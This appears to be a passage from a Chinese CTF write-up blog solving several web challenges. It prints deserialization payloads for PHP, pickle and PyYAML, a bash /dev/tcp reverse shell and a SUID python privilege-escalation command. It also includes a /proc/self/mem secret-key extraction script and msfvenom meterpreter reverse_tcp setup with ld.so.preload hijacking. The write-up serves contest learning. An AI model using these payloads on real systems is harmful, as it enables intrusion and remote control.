class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Pro&#123;</span><br><span class="line">    private $exp;</span><br><span class="line">    private $rce2;</span><br><span class="line"></span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;$rce2=$this-&gt;exp[$rce2];</span><br><span class="line">    &#125;</span><br><span class="line">    public  function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        call_user_func(&#x27;system&#x27;, &quot;cat /flag&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Yang</span><br><span class="line">&#123;</span><br><span class="line">    public function __call($name, $ary)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;key === true || $this-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            if ($this-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                call_user_func($this-&gt;now[$name], $ary[0]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function ycb()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;now = 0;</span><br><span class="line">        return $this-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Cheng</span><br><span class="line">&#123;</span><br><span class="line">    private $finish;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __get($value)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;$value = $this-&gt;name[$value];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Bei</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;CTF-&gt;ycb()) &#123;</span><br><span class="line">            $this-&gt;fine-&gt;YCB1($this-&gt;rce, $this-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key = false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function prohib($a)&#123;</span><br><span class="line">    $filter = &quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$a);</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[&quot;CTF&quot;];</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">    unserialize(prohib($a));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>之后就是一个pop链</p><p>paylaod如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class Pro&#123;</span><br><span class="line">    private $exp;</span><br><span class="line">    private $rce2;&#125;</span><br><span class="line"></span><br><span class="line">class Yang&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Cheng</span><br><span class="line">&#123;</span><br><span class="line">    private $finish;</span><br><span class="line">    public $name;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Bei</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new Bei();</span><br><span class="line">$a-&gt;rce = &#x27;/tmp/catcatf1ag.txt&#x27;;</span><br><span class="line">$a-&gt;rce1=&#x27;/tmp/catcatf1ag.txt&#x27;;</span><br><span class="line">$a-&gt;CTF = new Yang();</span><br><span class="line">$a-&gt;CTF-&gt;finish-&gt;finish =1;</span><br><span class="line">$a-&gt;fine = new Yang();</span><br><span class="line">$a-&gt;fine-&gt;finish1-&gt;name=1;</span><br><span class="line">$a-&gt;fine-&gt;finish-&gt;finish=1;</span><br><span class="line">$a-&gt;fine-&gt;now=[&quot;YCB1&quot;=&gt;&quot;highlight_file&quot;];</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>学到了新trick 这里也可以不用文件包含函数 直接双写绕过waf都可以</p><h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><p>flask伪造+python反序列化+提权</p><p>没怎么仔细好好学过python反序列化 在这里寄了</p><p>获得源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/verification&#x27;)</span><br><span class="line">def verification():</span><br><span class="line">    try:</span><br><span class="line">        attribute = session.get(&#x27;Attribute&#x27;)</span><br><span class="line">        if not isinstance(attribute, dict):</span><br><span class="line">            raise Exception</span><br><span class="line">    except Exception:</span><br><span class="line">        return &#x27;Hacker!!!&#x27;</span><br><span class="line">    if attribute.get(&#x27;name&#x27;) == &#x27;admin&#x27;:</span><br><span class="line">        if attribute.get(&#x27;admin&#x27;) == 1:</span><br><span class="line">            return secret</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Don&#x27;t play tricks on me&quot;</span><br><span class="line">    else:</span><br><span class="line">        return &quot;You are a perfect stranger to me&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></figure><p>一眼丁真 session伪造 直接解码session给了key的 <code>GWHTNrtE8JiVyR</code></p><p>之后访问<code>/src0de</code>路由再次拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/ppppppppppick1e&#x27;)</span><br><span class="line">def ppppppppppick1e():</span><br><span class="line">    try:</span><br><span class="line">        username = &quot;admin&quot;</span><br><span class="line">        rsp = make_response(&quot;Hello, %s &quot; % username)</span><br><span class="line">        rsp.headers[&#x27;hint&#x27;] = &quot;Source in /src0de&quot;</span><br><span class="line">        pick1e = request.cookies.get(&#x27;pick1e&#x27;)</span><br><span class="line">        if pick1e is not None:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        else:</span><br><span class="line">            return rsp</span><br><span class="line">        if check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            return &quot;Go for it!!!&quot;</span><br><span class="line">        else:</span><br><span class="line">            return &quot;No Way!!!&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        error_message = str(e)</span><br><span class="line">        return error_message</span><br><span class="line"></span><br><span class="line">    return rsp</span><br><span class="line"></span><br><span class="line">class GWHT():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></figure><p>考察python反序列化 并且有waf 要bypass R</p><p>所以用o指令来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import base64</span><br><span class="line">payload=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1&quot;&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br><span class="line">print(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>或者用i指令来绕过 都是出自:<a href="https://tttang.com/archive/1885/#toc_i">https://tttang.com/archive/1885/#toc_i</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import base64</span><br><span class="line">opcode=b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br><span class="line">print(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>反弹shell 发现还要提权 读不了flag</p><p><strong>因为这个题目python3.8存在suid 文件具有 SUID 权限，因此当普通用户运行它时，该程序会以文件所有者的权限来运行 所以我们可以提权</strong></p><p><code>python3.8 -c &quot;import os;os.execl(&#39;/bin/sh&#39;,&#39;sh&#39;,&#39;-p&#39;)&quot;</code> -c是命令行选项</p><p>或者更简单点<code>python3 -c &quot;print(open(&#39;/flag&#39;).read(0)&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解释：</span><br><span class="line">&quot;import os;os.execl(&#x27;/bin/sh&#x27;,&#x27;sh&#x27;,&#x27;-p&#x27;)&quot;：这部分是实际的 Python 代码片段，它由两部分组成：</span><br><span class="line">import os：这行代码导入了 Python 中的 os 模块，该模块提供了与操作系统交互的功能。</span><br><span class="line">os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-p&#x27;)：这是要执行的 Python 代码。它使用 os.execl() 函数执行了一个系统命令。具体地说：</span><br><span class="line">&#x27;/bin/sh&#x27; 是要执行的程序的路径，即 Unix Shell 的路径。</span><br><span class="line">&#x27;sh&#x27; 是新程序的名称，通常是 Shell 的名称。</span><br><span class="line">&#x27;-p&#x27; 是传递给新程序的参数，这里表示以特权模式启动 Shell。</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693661431373-9a66c8fd-ce25-40a0-8847-bad7363150a5.png" alt="img"></p><h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>非预期了payload:<code>/read?file=/proc/1/environ</code></p><p>读环境变量就有</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693660447816-3625b299-1051-4a75-abc6-1443251980ad.png" alt="img"></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>考点:</p><ul><li>通过&#x2F;proc&#x2F;self&#x2F;mem内存获取secretkey</li><li>python的变量污染导致render可以目录穿越</li><li>任意文件读取</li></ul><p>首先获得源码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import uuid</span><br><span class="line">from flask import *</span><br><span class="line">from werkzeug.utils import *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] =str(uuid.uuid4()).replace(&quot;-&quot;,&quot;*&quot;)+&quot;Boogipopisweak&quot;</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    name=request.args.get(&quot;name&quot;,&quot;name&quot;)</span><br><span class="line">    m1sery=[request.args.get(&quot;m1sery&quot;,&quot;Doctor.Boogipop&quot;)]</span><br><span class="line">    if(session.get(&quot;name&quot;)==&quot;Dr.Boog1pop&quot;):</span><br><span class="line">        blacklist=re.findall(&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;, name, re.IGNORECASE)</span><br><span class="line">        if blacklist:</span><br><span class="line">            return &quot;bad hacker no way&quot;</span><br><span class="line">        exec(f&#x27;for [&#123;name&#125;] in [&#123;m1sery&#125;]:print(&quot;strange?&quot;)&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        session[&#x27;name&#x27;] = &quot;Doctor&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;,name=session.get(&quot;name&quot;))</span><br><span class="line">@app.route(&#x27;/read&#x27;)</span><br><span class="line">def read():</span><br><span class="line">        file = request.args.get(&#x27;file&#x27;)</span><br><span class="line">        fileblacklist=re.findall(&quot;/flag|fl|ag/&quot;,file, re.IGNORECASE)</span><br><span class="line">        if fileblacklist:</span><br><span class="line">            return &quot;bad hacker!&quot;</span><br><span class="line">        start=request.args.get(&quot;start&quot;,&quot;0&quot;)</span><br><span class="line">        end=request.args.get(&quot;end&quot;,&quot;0&quot;)</span><br><span class="line">        if start==&quot;0&quot; and end==&quot;0&quot;:</span><br><span class="line">            return open(file,&quot;rb&quot;).read()</span><br><span class="line">        else:</span><br><span class="line">            start,end=int(start),int(end)</span><br><span class="line">            f=open(file,&quot;rb&quot;)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            return data</span><br><span class="line">@app.route(&quot;/&lt;path:path&gt;&quot;)</span><br><span class="line">def render_page(path):</span><br><span class="line">    print(os.path.pardir)</span><br><span class="line">    print(path)</span><br><span class="line">    if not os.path.exists(&quot;templates/&quot; + path):</span><br><span class="line">        return &quot;not found&quot;, 404</span><br><span class="line">    return render_template(path)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=False,</span><br><span class="line">        host=&quot;0.0.0.0&quot;</span><br><span class="line">    )</span><br><span class="line">    print(app.config[&#x27;SECRET_KEY&#x27;])</span><br></pre></td></tr></table></figure><p>首先就是去伪造session 老考点了 通过计算内存偏移量来读取内存中的secretkey</p><p>读取<code>/proc/self/maps</code>可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p><p><code>/proc/self/mem</code>是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p><p>脚本如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import  re</span><br><span class="line">import requests</span><br><span class="line">url=&quot;http://8.130.34.53:8848&quot;</span><br><span class="line">maps_url = f&quot;&#123;url&#125;/read?file=/proc/self/maps&quot;</span><br><span class="line">maps_reg = &quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span><br><span class="line">maps = re.findall(maps_reg, requests.get(maps_url).text)</span><br><span class="line">print(maps)</span><br><span class="line">#print(requests.get(maps_url).text)</span><br><span class="line">for m in maps:</span><br><span class="line">    print(m)</span><br><span class="line">    start, end = m.split(&quot;-&quot;)[0], m.split(&quot;-&quot;)[1]</span><br><span class="line">    Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16))</span><br><span class="line">    read_url = f&quot;&#123;url&#125;/read?file=/proc/self/mem&amp;start=&#123;Offset&#125;&amp;end=&#123;Length&#125;&quot;</span><br><span class="line">    s = requests.get(read_url).content</span><br><span class="line">    rt = re.findall(b&quot;[a-z0-9]&#123;8&#125;\*[a-z0-9]&#123;4&#125;\*[a-z0-9]&#123;4&#125;\*[a-z0-9]&#123;4&#125;\*[a-z0-9]&#123;12&#125;Boogipopisweak&quot;, s)</span><br><span class="line">    print(rt)</span><br></pre></td></tr></table></figure><p>然后就是我不知道的知识了 直接来看神のWP<br>首先是python的一个黑魔法导致变量覆盖</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694011985226-0e294a99-187a-45f7-9268-6a56df3e24ad.png" alt="img"></p><p>所以利用点在这里:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(f&#x27;for [&#123;name&#125;] in [&#123;m1sery&#125;]:print(&quot;strange?&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>其次我们是不是可以覆盖环境变量 当然神已经考虑到了：</p><blockquote><p>那么假如我们想覆盖环境变量可以怎么做呢？</p><p><code>[[str][0]for[os.environ[&#39;BASH_FUNC_echo%%&#39;]]in[[&#39;() &#123; id; &#125;&#39;]]]</code></p><p>按照上述代码就可以覆盖环境变量，调用了os模块进行污染，如上代码可以rce输出id指令，但是我在题目里ban了，因此是不可行的。</p></blockquote><p>这里涉及到之前idek考的一个pydash原型链污染的非预期了，是通过污染<code>os.path.pardir</code>这个变量来允许目录穿越的，我们污染了os.path.pardir就可以实现路径穿越了 修改的值为任意 </p><p>来自：<a href="https://tttang.com/archive/1876/#toc_ospathpardir">https://tttang.com/archive/1876/#toc_ospathpardir</a></p><p>至于为什么嘛 分析源码分析的 。。。。qwq？？？？？？？ 🐂 我记住结论了:)</p><p>因此整个步骤为:</p><ol><li>从内存中通过偏移量读取secretkey 伪造session</li><li>然后利用python黑魔法去污染os.path.pardir</li><li>路径穿越读flag</li></ol><p>环境给的flag位于&#x2F;tmp&#x2F;flag中 所以路径穿越即可 记得路径要url编码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694012734069-f27e4a64-739c-4798-bbba-e4a8545c51b6.png" alt="img"></p><p>真不错啊 学到知识好多！</p><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><p>源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">import tarfile</span><br><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from hashlib import md5</span><br><span class="line">import yaml</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def waf(s):  #设置waf</span><br><span class="line">    flag = True</span><br><span class="line">    blacklist = [&#x27;bytes&#x27;,&#x27;eval&#x27;,&#x27;map&#x27;,&#x27;frozenset&#x27;,&#x27;popen&#x27;,&#x27;tuple&#x27;,&#x27;exec&#x27;,&#x27;\\&#x27;,&#x27;object&#x27;,&#x27;listitems&#x27;,&#x27;subprocess&#x27;,&#x27;object&#x27;,&#x27;apply&#x27;]</span><br><span class="line">    for no in blacklist:</span><br><span class="line">        if no.lower() in str(s).lower():</span><br><span class="line">            flag= False</span><br><span class="line">            print(no)</span><br><span class="line">            break</span><br><span class="line">    return flag</span><br><span class="line">def extractFile(filepath, type):     </span><br><span class="line"></span><br><span class="line">    extractdir = filepath.split(&#x27;.&#x27;)[0]  #获取上传文件的文件名不包括后缀</span><br><span class="line">    if not os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if type == &#x27;tar&#x27;:</span><br><span class="line">        tf = tarfile.TarFile(filepath) #创建了一个 tarfile.TarFile 对象，用于操作tar压缩文件</span><br><span class="line">        tf.extractall(extractdir)  #将tar文件中的所有内容解压到指定的目录extractdir中</span><br><span class="line">        return tf.getnames()  #获取解压后的文件名列表并且返回</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def main():</span><br><span class="line">        fn = &#x27;uploads/&#x27; + md5().hexdigest()  #创建文件上传路径初始化</span><br><span class="line">        if not os.path.exists(fn):</span><br><span class="line">            os.makedirs(fn)</span><br><span class="line">        return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload():</span><br><span class="line"></span><br><span class="line">    if request.method == &#x27;GET&#x27;:</span><br><span class="line">        return redirect(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        upFile = request.files[&#x27;file&#x27;]</span><br><span class="line">        print(upFile)</span><br><span class="line">        if re.search(r&quot;\.\.|/&quot;, upFile.filename, re.M|re.I) != None:  #匹配上传的文件名包不包括..或者/并且匹配多行和大小写</span><br><span class="line">            return &quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span><br><span class="line"></span><br><span class="line">        savePath = f&quot;uploads/&#123;upFile.filename&#125;&quot;</span><br><span class="line">        print(savePath) </span><br><span class="line">        upFile.save(savePath) #保存文件</span><br><span class="line"></span><br><span class="line">        if tarfile.is_tarfile(savePath):  #用于检查给定的文件路径 savePath 是否是一个有效的tar压缩文件</span><br><span class="line">            zipDatas = extractFile(savePath, &#x27;tar&#x27;)</span><br><span class="line">            return render_template(&#x27;result.html&#x27;, path=savePath, files=zipDatas)</span><br><span class="line">        else:</span><br><span class="line">            return f&quot;&lt;script&gt;alert(&#x27;&#123;upFile.filename&#125; upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    if request.args:</span><br><span class="line">        username = request.args.get(&#x27;username&#x27;)</span><br><span class="line">        with open(f&#x27;config/&#123;username&#125;.yaml&#x27;, &#x27;rb&#x27;) as f: #打开yaml文件</span><br><span class="line">            Config = yaml.load(f.read()) #反序列化点</span><br><span class="line">            return render_template(&#x27;admin.html&#x27;, username=&quot;admin&quot;, message=&quot;success&quot;)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;127.0.0.1&#x27;, port=8000)</span><br></pre></td></tr></table></figure><p>大概分析在源码注释了 大致就需要我们进行一个路径穿越将我们上传后解压的文件穿越到<code>config/</code>这样我们的恶意文件才会被打开并且进行yaml反序列化</p><p>考点：tar的zipslip文件覆盖，yaml反序列化</p><p>文件内容为<code>!!python/object/apply:os.system [&quot;whoami&quot;]</code>改为反弹shell就行 来自<a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonobjectapply">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonobjectapply</a> 我愿称之为王の宝库</p><p>之后就是打包了<code>tar cPvf a.tar ../../config/a.yaml</code></p><p>然后上传 访问&#x2F;src路由 传参usename&#x3D;a 即可触发反弹shell</p><h2 id="Ez-java"><a href="#Ez-java" class="headerlink" title="Ez_java"></a>Ez_java</h2><p>不会 没学</p><h2 id="Ez-web"><a href="#Ez-web" class="headerlink" title="Ez_web"></a>Ez_web</h2><p>考点：</p><ul><li>&#x2F;etc&#x2F;ld.so.preload配置文件 劫持</li></ul><p>简单理解在这个文件中我们可以设置一些恶意的文件绝对路径</p><p>然后在我们输入指令时 就会先预加载<code>ld.so.preload</code>这个文件中的内容 达到劫持效果</p><p>所以这道大致题目思路:</p><ol><li>先由msf生成一个木马 然后上传上去</li><li>然后在自己vps 起msfconsole 设置好相应的参数 开始监听等待反弹</li><li>然后在题目中随便执行一个指令就会被劫持了</li></ol><p>由于我没有环境只能大致复现一下 因为复现还给自己kali虚拟机整崩了 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694094226089-5913781d-64aa-45ea-a2b2-59f67b604c93.jpeg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#生成木马 这里有个点就是我只能在我vps的/root下生成木马 其他地方生成时都是permission denied 就算给了777都是这样</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=vps的ip LPORT=1000 -f elf-so -o evil.elf</span><br><span class="line">然后依次执行以下命令:</span><br><span class="line">#选择攻击载荷:</span><br><span class="line">use payload/linux/x64/meterpreter/reverse_tcp </span><br><span class="line">#展示相关信息</span><br><span class="line">show options</span><br><span class="line">#设置反弹接受shell的主机ip 这里设置成本机</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">#监听ip 这里当时生成木马时端口是多少 就要设置成多少</span><br><span class="line">set lport 1000</span><br><span class="line">#开始执行利用</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>参考于:</p><p><a href="https://blog.csdn.net/whatday/article/details/108890018">https://blog.csdn.net/whatday/article/details/108890018</a></p><p><a href="https://www.anquanke.com/post/id/254388">https://www.anquanke.com/post/id/254388</a></p><p><a 